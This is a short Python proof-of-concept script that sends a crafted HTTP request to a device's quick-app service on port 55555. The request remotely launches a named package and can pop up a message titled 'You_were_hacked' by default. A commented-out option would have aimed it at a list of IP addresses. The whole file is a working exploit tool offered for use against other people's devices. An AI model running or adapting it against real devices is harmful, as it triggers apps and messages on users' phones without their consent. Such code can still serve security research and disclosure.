#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import sys
import time
import argparse
import requests

class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        # group = parser.add_mutually_exclusive_group()
        # group.add_argument(
            # "-i", "--ip", dest="ipAddress", metavar="ip", default="127.0.0.1",
            # help="specify ip address (default: 127.0.0.1)"
        # )
        # group.add_argument(
            # "-l", "--list", dest="ipList", metavar="list",
            # help="specify ip list file path (example: ./ips.txt)"
        # )
        parser.add_argument(
            "-i", "--ip", dest="ipAddress", metavar="ip", default="127.0.0.1",
            help="specify ip address (default: 127.0.0.1)"
        )
        parser.add_argument(
            "-p", "--port", dest="portNumber", metavar="port", default="55555",
            help="specify port number (default: 55555)"
        )
        parser.add_argument(
            "-n", "--package-name", dest="packageName", metavar="name", default="1",
            help="specify quickapp package name (default: 1)"
        )
        parser.add_argument(
            "-s", "--title-name", dest="titleName", metavar="title", default="You_were_hacked",
            help="specify popup message title name (default: 'You_were_hacked')"
        )
        parser.add_argument(
            "-u", "--prompt", action="store_true", dest="promptOn", default=False,
            help="trigger popup message (default: False)"
        )
        return parser.parse_args()

opt = Parser().optparse()

ip = opt.ipAddress
#path = opt.ipList
port = opt.portNumber
pkg_name = opt.packageName
popup = opt.promptOn
title_name = opt.titleName
request_url = "http://{}:{}/?i={}&__PROMPT__={}&__NAME__={}".format(ip,port,pkg_name,int(popup),title_name)

def main():
    # if path:
        # f = open(path,encoding='utf-8')
        # lines = f.readlines()
        # for line in lines:
            # ip = line
            # r = requests.get(request_url)
            # if r.status_code == 200:
                # print("[+] Send Request to:", ip)
            # line = f.readline()
        # f.close()
    r = requests.get(request_url)
    if r.status_code == 200:
        print("[+] Send Request to:", ip)

if __name__ == '__main__':
    try:
        main()
    # except FileNotFoundError:
        # print("[!] File is not found.")
    # except PermissionError:
        # print("[!] You don't have permission to access this file.")
    except (KeyboardInterrupt, SystemExit):
        pass
